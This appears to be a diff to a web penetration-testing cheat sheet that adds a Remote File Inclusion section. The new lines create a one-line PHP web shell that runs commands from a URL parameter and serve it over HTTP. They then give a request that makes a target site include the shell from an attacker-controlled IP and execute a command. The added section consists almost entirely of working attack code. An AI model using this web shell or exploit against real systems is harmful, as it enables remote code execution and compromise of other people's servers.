@@ -281,4 +281,11 @@ https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/word
 -> poisoning.txt  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/posoning.txt  
 
-
+## Remote File Inclusion (RFI)
+```
+echo "<?php echo shell_exec($_GET['cmd']); ?>" > evil.txt
+python -m http.server 80
+```
+```
+http://site.com/menu.php?file=http://192.168.0.20/evil.txt&cmd=ipconfig
+```
